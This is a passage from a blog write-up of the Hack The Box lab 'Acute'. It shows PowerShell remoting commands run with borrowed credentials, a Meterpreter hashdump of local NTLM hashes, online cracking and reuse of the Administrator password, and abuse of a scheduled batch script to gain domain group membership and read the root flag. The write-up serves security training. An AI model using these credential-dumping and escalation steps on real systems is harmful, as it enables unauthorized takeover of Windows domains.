Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

ERROR: Unable to get user claims information.
</pre></table></code></div></div><p>I was a full administrator as <code class="language-plaintext highlighter-rouge">jmorgan</code> back on Acute-PC01.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{whoami /all} -credential $cred

USER INFORMATION
----------------

User Name    SID                                           
============ ==============================================

acute\imonks S-1-5-21-1786406921-1914792807-2072761762-1107

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes  
========================================== ================ ============================================== ==================================================

Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
ACUTE\Managers                             Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</pre></table></code></div></div><p>The user <code class="language-plaintext highlighter-rouge">imonks</code> was in an interesting group called <code class="language-plaintext highlighter-rouge">acute/Managers</code>. For some reason the command <code class="language-plaintext highlighter-rouge">whoami /all</code> worked as an administrator, even though it hadn’t earlier.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{net group MANAGERS} -credential $cred

Group name     Managers

Comment        

Members
-------------------------------------------------------------------------------

awallace                 imonks                   

The command completed successfully.
</pre></table></code></div></div><p>I checked the membership of the <code class="language-plaintext highlighter-rouge">Managers</code> group and noticed that there was another user in this group: <code class="language-plaintext highlighter-rouge">awallace</code>.</p><h3 id="cracking-the-administrator-password">Cracking the Administrator password</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>meterpreter &gt; migrate 632
[*] Migrating from 6768 to 632...
[*] Migration completed successfully.
meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
</pre></table></code></div></div><p>Since I was already elevated to <code class="language-plaintext highlighter-rouge">SYSTEM</code>, I was able to run hashdump after migrating processes to <code class="language-plaintext highlighter-rouge">lsass.exe</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_12_cracked.png" alt="The website CrackStation showing the admin password cracked" /></p><p>Using the website crackstation.net I was able to quickly get the password for the Administrator hash. However, using the password <code class="language-plaintext highlighter-rouge">Password@123</code> did not work, so I figured that maybe another user might be using this password.</p><h2 id="enumeration-as-awallace">Enumeration as awallace</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre><td class="rouge-code"><pre>PS C:\utils&gt; $passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential ("acute\awallace",$passwd)

PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{whoami /all} -credential $cred

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================

acute\awallace S-1-5-21-1786406921-1914792807-2072761762-1104

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes
============================================ ================ ============================================== ===============================================================

Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Certificate Service DCOM Access      Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                       Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
ACUTE\Domain Admins                          Group            S-1-5-21-1786406921-1914792807-2072761762-512  Mandatory group, Enabled by default, Enabled group             
ACUTE\Managers                               Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group             
ACUTE\Site_Admin                             Group            S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group             
ACUTE\Denied RODC Password Replication Group Alias            S-1-5-21-1786406921-1914792807-2072761762-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level         Label            S-1-16-12288                                             

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======

SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</pre></table></code></div></div><p>I was now able to run commands as <code class="language-plaintext highlighter-rouge">awallace</code> who was an administrator on <code class="language-plaintext highlighter-rouge">ATSSERVER</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>PS C:\utils&gt; 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{net group "Domain Admins"} -credential $cred

Group name     Domain Admins

Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------

Administrator            

The command completed successfully.
</pre></table></code></div></div><p>Administrator was a Domain Admin, and was not a disabled account like it should be.</p><h2 id="keepmeon">keepmeon</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>PS C:\utils&gt; 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{Get-ChildItem 'C:\Program Files', 'C:\

Program Files (x86)' } -credential $cred

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    

d-----        12/21/2021  12:04 AM                common files                       ATSSERVER                         
d-----        12/21/2021  12:11 AM                Hyper-V                            ATSSERVER                         
d-----         9/15/2018   8:12 AM                internet explorer                  ATSSERVER                         
d-----         7/16/2022   9:42 AM                keepmeon                           ATSSERVER                         
d-----        12/21/2021  12:04 AM                VMware                             ATSSERVER                         
d-----        12/20/2021   9:19 PM                Windows Defender                   ATSSERVER                         
d-----        12/20/2021   9:12 PM                Windows Defender Advanced Threat   ATSSERVER                         
                                                  Protection                                                           
d-----        12/21/2021   2:13 PM                WindowsPowerShell                  ATSSERVER                         

    Directory: C:\Program Files (x86)

Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    

d-----         9/15/2018   8:21 AM                common files                       ATSSERVER                         
d-----         9/15/2018   8:12 AM                internet explorer                  ATSSERVER                         
d-----         9/15/2018   8:12 AM                Microsoft.NET                      ATSSERVER                         
d-----          8/5/2021   8:29 PM                Windows Defender                   ATSSERVER                         
d-----         9/15/2018   8:12 AM                WindowsPowerShell                  ATSSERVER                         
</pre></table></code></div></div><p>There was an interesting folder called <code class="language-plaintext highlighter-rouge">keepmeon</code> in the Program Files directory.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{Get-ChildItem 'C:\Program Files\keepmeon' } -credential $cred

    Directory: C:\Program Files\keepmeon

Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    

-a----        12/21/2021   2:57 PM            128 keepmeon.bat                       ATSSERVER                         
-a----         7/16/2022   9:50 AM             45 uwu.bat                            ATSSERVER                         
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">keepmeon</code> folder contained two .bat script files.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{Get-Content 'C:\Program Files\keepmeon\uwu.bat' } -credential $cred

net group Site_Admin awallace /add /domain 
</pre></table></code></div></div><p>I was not able to run the .bat file no matter how I tried (I tried many things). Running the command inside by iteslf resulted in <code class="language-plaintext highlighter-rouge">System Error 5: Access is denied</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{$(cat C:\"Program Files"\keepmeon\keepmeon.bat) } -credential $cred

REM This is run every 5 minutes. For Lois use ONLY

@echo off

 for /R %%x in (*.bat) do (

 if not "%%x" == "%~0" call "%%x"

)
</pre></table></code></div></div><p>The other script was interesting, as it seemed as if it would run any other .bat files in the same directory. There seemed to be a scheduled task that would run this every 5 minutes as Lois. I remembered that earlier I had seen a note mentioning that only Lois could elevate a user to the site admin group, which is what the other script seemed to be doing.</p><p>Note: Looking back, the script <code class="language-plaintext highlighter-rouge">uwu.bat</code> was likely a privilege escalation script written by another user, and had not been intended to be found there. When I checked my group membership after this I was already a member of the <code class="language-plaintext highlighter-rouge">site_admin</code> group. I think this saved me a minute of trying to figure out how the group was spelled in order to write that batch script myself.</p><h3 id="roottxt">Root.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{cat C:\Users\Administrator\Desktop\root.txt } -credential $cred

e52794b6fbeaf994e93dce5c5f3605d0
</pre></table></code></div></div><p>After finding myself as a member of the <code class="language-plaintext highlighter-rouge">site_admin</code> group, I was finally able to access the files in the <code class="language-plaintext highlighter-rouge">C:\Users\Administrator</code> directory, and could gather the root flag!</p><p>Thanks to <a href="https://app.hackthebox.com/users/610173"><code class="language-plaintext highlighter-rouge">dmw0ng</code></a> for creating this challenging Windows machine. It was great to get the chance to improve my PowerShell and Meterpreter skills. I disliked needing to use that specific command to move forward, but it was fun doing all of the research into how to take screenshots using PowerShell and the Windows API anyway.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_13_pwned.png" alt="Proof that the machine Acute had been finished by WolfZweiler (me!)" /></p><p>If you like this content and would like to see more, please consider <a href="https://www.buymeacoffee.com/zweilosec">buying me a coffee</a>!</p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/metadata/" class="post-tag no-text-decoration" >metadata</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/dmw0ng/" class="post-tag no-text-decoration" >dmw0ng</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Acute Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/acute/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Acute Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/acute/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Acute Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/acute/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/sauna/"><div class="card-body"> <span class="timeago small" > Jun 3, 2020 <i class="unloaded">2020-06-03T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sauna Writeup</h3><div class="text-muted small"><p> HTB - Sauna Overview A fairly easy Windows machine that requires a little ‘outside the box’ thinking in order to get the initial foothold. After that, simple enumeration will give everything e...</p></div></div></a></div><div class="card"> <a href="/posts/multimaster/"><div class="card-body"> <span class="timeago small" > Jul 25, 2020 <i class="unloaded">2020-07-25T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Multimaster Writeup</h3><div class="text-muted small"><p> HTB - Multimaster Overview Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is mi...</p></div></div></a></div><div class="card"> <a href="/posts/reel2/"><div class="card-body"> <span class="timeago small" > Feb 16, 2021 <i class="unloaded">2021-02-16T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Reel2 Writeup</h3><div class="text-muted small"><p> HTB - Reel2 Overview This machine was not as difficult in some respects as other Hard-difficulty machines, but the way that the machine was realistically hardened made it more challenging. The...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/catch/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Catch Writeup</p></a> <a href="/posts/jekyll-chirpy-github-pages-blog/" class="btn btn-outline-primary" prompt="Newer"><p>How to use GitHub Pages to host a blog with Jekyll Chirpy theme</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
